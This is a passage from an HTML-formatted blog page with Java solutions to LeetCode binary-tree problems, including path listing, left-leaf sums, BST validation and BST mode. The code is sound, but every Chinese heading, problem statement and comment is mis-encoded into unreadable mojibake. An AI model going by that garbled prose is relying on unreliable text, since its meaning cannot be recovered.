class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; paths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        traversal(root, paths, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">traversal</span><span class="params">(TreeNode root, List&lt;Integer&gt; paths, List&lt;String&gt; res)</span>&#123;</span><br><span class="line">        paths.add(root.val); <span class="comment">// å‰åºéå†</span></span><br><span class="line">        <span class="comment">// é‡åˆ°å¶å­ç»“ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// è¾“å‡º</span></span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; paths.size()-<span class="number">1</span>; i++)&#123;</span><br><span class="line">                sb.append(paths.get(i)).append(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(paths.get(paths.size() - <span class="number">1</span>)); <span class="comment">// è®°å½•æœ€åä¸€ä¸ªç»“ç‚¹</span></span><br><span class="line">            res.add(sb.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// é€’å½’å’Œå›æº¯åŒæ—¶è¿›è¡Œæ‰€ä»¥è¦åœ¨ä¸€ä¸ªèŠ±æ‹¬å·é‡Œ</span></span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            traversal(root.left, paths, res);</span><br><span class="line">            paths.remove(paths.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            traversal(root.right, paths, res);</span><br><span class="line">            paths.remove(paths.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        deal(root, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deal</span><span class="params">(TreeNode node, String s)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s).append(node.val).toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s).append(node.val).append(<span class="string">&quot;-&gt;&quot;</span>).toString();</span><br><span class="line">        deal(node.left, tmp);</span><br><span class="line">        deal(node.right, tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="404-å·¦å¶å­ä¹‹å’Œ"><a href="#404-å·¦å¶å­ä¹‹å’Œ" class="headerlink" title="404.å·¦å¶å­ä¹‹å’Œ"></a>404.å·¦å¶å­ä¹‹å’Œ</h2><p>è®¡ç®—ç»™å®šäºŒå‰æ ‘çš„æ‰€æœ‰å·¦å¶å­ä¹‹å’Œã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-26.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftValue</span> <span class="operator">=</span> sumOfLeftLeaves(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightValue</span> <span class="operator">=</span> sumOfLeftLeaves(root.right);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">midValue</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span> &amp;&amp; root.left.left == <span class="literal">null</span> &amp;&amp; root.left.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            midValue = root.left.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> midValue + leftValue + rightValue;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿­ä»£æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.add(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span> &amp;&amp; node.left.left ==<span class="literal">null</span> &amp;&amp; node.left.right == <span class="literal">null</span>)&#123;</span><br><span class="line">                result += node.left.val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>) stack.add(node.left);</span><br><span class="line">            <span class="keyword">if</span>(node.right != <span class="literal">null</span>) stack.add(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="513-æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼"><a href="#513-æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼" class="headerlink" title="513.æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼"></a>513.æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼</h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘çš„ æ ¹èŠ‚ç‚¹ rootï¼Œè¯·æ‰¾å‡ºè¯¥äºŒå‰æ ‘çš„ æœ€åº•å±‚ æœ€å·¦è¾¹ èŠ‚ç‚¹çš„å€¼ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-27.png" alt="è¿™å¼ å›¾æ˜¯7"></p><p>é€’å½’æ³•æ±‚è§£æ—¶è¦åŒæ—¶è®°å½•æ·±åº¦ï¼Œä½¿ç”¨å±‚æ¬¡éå†æ›´ä¸ºæ–¹ä¾¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€’å½’æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">Deep</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        value = root.val;</span><br><span class="line">        findLeftValue(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">findLeftValue</span><span class="params">(TreeNode root, <span class="type">int</span> deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(deep &gt; Deep)&#123;</span><br><span class="line">                value = root.val;</span><br><span class="line">                Deep = deep;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>) findLeftValue(root.left, deep+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>) findLeftValue(root.right, deep+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿­ä»£æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    res = poll.val;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="112-è·¯å¾„æ€»å’Œ"><a href="#112-è·¯å¾„æ€»å’Œ" class="headerlink" title="112. è·¯å¾„æ€»å’Œ"></a>112. è·¯å¾„æ€»å’Œ</h2><p>ç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root å’Œä¸€ä¸ªè¡¨ç¤ºç›®æ ‡å’Œçš„æ•´æ•° targetSum ã€‚åˆ¤æ–­è¯¥æ ‘ä¸­æ˜¯å¦å­˜åœ¨ æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹ çš„è·¯å¾„ï¼Œè¿™æ¡è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹å€¼ç›¸åŠ ç­‰äºç›®æ ‡å’Œ targetSum ã€‚å¦‚æœå­˜åœ¨ï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="comment">// å¶å­ç»“ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> hasPathSum(root.left, targetSum);</span><br><span class="line">            <span class="keyword">if</span>(left) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> hasPathSum(root.right, targetSum);</span><br><span class="line">            <span class="keyword">if</span>(right) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="98-éªŒè¯äºŒå‰æœç´¢æ ‘"><a href="#98-éªŒè¯äºŒå‰æœç´¢æ ‘" class="headerlink" title="98.éªŒè¯äºŒå‰æœç´¢æ ‘"></a>98.éªŒè¯äºŒå‰æœç´¢æ ‘</h2><p>ç»™ä½ ä¸€ä¸ªäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œåˆ¤æ–­å…¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„äºŒå‰æœç´¢æ ‘ã€‚<br>æœ‰æ•ˆ äºŒå‰æœç´¢æ ‘å®šä¹‰å¦‚ä¸‹ï¼š<br>èŠ‚ç‚¹çš„å·¦å­æ ‘åªåŒ…å« å°äº å½“å‰èŠ‚ç‚¹çš„æ•°ã€‚<br>èŠ‚ç‚¹çš„å³å­æ ‘åªåŒ…å« å¤§äº å½“å‰èŠ‚ç‚¹çš„æ•°ã€‚<br>æ‰€æœ‰å·¦å­æ ‘å’Œå³å­æ ‘è‡ªèº«å¿…é¡»ä¹Ÿæ˜¯äºŒå‰æœç´¢æ ‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)</span><br><span class="line">            stack.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">curr</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span>(curr != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(curr.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    stack.add(curr.right);</span><br><span class="line">                &#125;</span><br><span class="line">                stack.add(curr);</span><br><span class="line">                stack.add(<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span>(curr.left != <span class="literal">null</span>)</span><br><span class="line">                    stack.add(curr.left);</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(pre != <span class="literal">null</span> &amp;&amp; pre.val &gt;= temp.val)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                pre = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    TreeNode max;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å·¦</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> isValidBST(root.left);</span><br><span class="line">        <span class="keyword">if</span>(!left)&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">        <span class="comment">// ä¸­</span></span><br><span class="line">        <span class="keyword">if</span>(max != <span class="literal">null</span> &amp;&amp; root.val &lt;= max.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        max = root;</span><br><span class="line">        <span class="comment">// å³</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> isValidBST(root.right);</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isValidBST(root, Long.MIN_VALUE, Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode node, <span class="type">long</span> lower, <span class="type">long</span> upper)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.val &lt;= lower || node.val &gt;= upper)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isValidBST(node.left, lower, node.val) &amp;&amp; isValidBST(node.right, node.val, upper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="501-äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°"><a href="#501-äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°" class="headerlink" title="501.äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°"></a>501.äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°</h2><p>ç»™ä½ ä¸€ä¸ªå«é‡å¤å€¼çš„äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰çš„æ ¹èŠ‚ç‚¹ root ï¼Œæ‰¾å‡ºå¹¶è¿”å› BST ä¸­çš„æ‰€æœ‰ ä¼—æ•°ï¼ˆå³ï¼Œå‡ºç°é¢‘ç‡æœ€é«˜çš„å…ƒç´ ï¼‰ã€‚</p><p>å¦‚æœæ ‘ä¸­æœ‰ä¸æ­¢ä¸€ä¸ªä¼—æ•°ï¼Œå¯ä»¥æŒ‰ ä»»æ„é¡ºåº è¿”å›ã€‚</p><p>å‡å®š BST æ»¡è¶³å¦‚ä¸‹å®šä¹‰ï¼š</p><p>ç»“ç‚¹å·¦å­æ ‘ä¸­æ‰€å«èŠ‚ç‚¹çš„å€¼ å°äºç­‰äº å½“å‰èŠ‚ç‚¹çš„å€¼<br>ç»“ç‚¹å³å­æ ‘ä¸­æ‰€å«èŠ‚ç‚¹çš„å€¼ å¤§äºç­‰äº å½“å‰èŠ‚ç‚¹çš„å€¼<br>å·¦å­æ ‘å’Œå³å­æ ‘éƒ½æ˜¯äºŒå‰æœç´¢æ ‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; resList;</span><br><span class="line">    <span class="type">int</span> maxCount;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    TreeNode pre;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        maxCount = <span class="number">0</span>;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        pre = <span class="literal">null</span>;</span><br><span class="line">        findMode1(root);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[resList.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; resList.size(); i++)&#123;</span><br><span class="line">            res[i] = resList.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findMode1</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        findMode1(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootValue</span> <span class="operator">=</span> root.val;</span><br><span class="line">        <span class="comment">// è®¡æ•°</span></span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span> || rootValue != pre.val)&#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ›´æ–°ç»“æœåŠmaxCount</span></span><br><span class="line">        <span class="keyword">if</span>(count &gt; maxCount)&#123;</span><br><span class="line">            resList.clear();</span><br><span class="line">            resList.add(rootValue);</span><br><span class="line">            maxCount = count;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span 